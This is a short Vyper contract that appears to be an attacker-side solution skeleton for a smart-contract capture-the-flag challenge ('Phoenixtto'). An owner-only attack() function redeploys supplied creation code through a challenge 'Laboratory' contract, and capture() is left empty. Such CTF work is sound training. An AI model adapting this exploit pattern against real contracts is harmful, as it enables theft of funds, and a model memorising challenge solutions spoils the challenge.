# @version ^0.3.7

interface ILaboratory:
    def addr() -> address: view
    def reBorn(code: Bytes[1024]): nonpayable
    def isCaught() -> bool: view

owner: immutable(address)

laboratory: ILaboratory

@external
@payable
def __init__(_laboratory: address):
    owner = msg.sender
    self.laboratory = ILaboratory(_laboratory)

@external
def attack(creation_code: Bytes[1024]):
    assert msg.sender == owner, "!owner"
    self.laboratory.reBorn(creation_code)
    assert self.laboratory.isCaught(), "!caught"

@external
@view
def phoenixtto_address() -> address:
    return self.laboratory.addr()

@external
def capture(_newOwner: String[64]):
    pass
